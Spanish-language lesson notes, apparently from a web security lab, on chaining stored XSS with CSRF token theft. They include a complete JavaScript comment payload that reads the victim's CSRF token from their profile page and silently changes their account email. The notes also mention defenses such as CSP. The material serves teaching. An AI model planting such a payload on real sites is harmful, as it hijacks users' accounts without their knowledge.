Esta lección continúa el ataque iniciado previamente, donde explotamos una vulnerabilidad de XSS almacenado para comprometer la protección CSRF de la aplicación.

En este caso, consolidamos la explotación automatizando todo el flujo: cuando una víctima visualiza el comentario malicioso, su navegador realiza una petición a su propia página de perfil, extrae el token CSRF del formulario oculto, y lo reutiliza inmediatamente para enviar una petición de cambio de correo electrónico sin que el usuario lo sepa.

Este enfoque permite realizar una acción sensible —como modificar información de cuenta— sin interacción directa por parte de la víctima, utilizando su sesión activa y su token legítimo.

La clase demuestra cómo XSS y CSRF pueden combinarse para romper la lógica de seguridad de muchas aplicaciones, y por qué es crucial implementar defensas adicionales como el uso de encabezados personalizados, políticas de contenido restrictivas (CSP), y el aislamiento del contenido generado por el usuario del contexto de ejecución del frontend.

Solucion seguimos con el codigo
![Pasted_image_20250717181112.png](/Imagenes/Pasted_image_20250717181112.png)
<script>
  var req = new XMLHttpRequest(); 
  req.open("GET", "/my-account", false); 
  req.send();
  var response = req.responseText;
  var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
  var req2 = new XMLHttpRequest();
  req2.open('POST', '/my-account/change-email', true);
  req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token); 
  req2.send(data);
</script>

y lo ideal seria ponerlo en la seccion de comentarios
![Pasted_image_20250717181635.png](/Imagenes/Pasted_image_20250717181635.png)
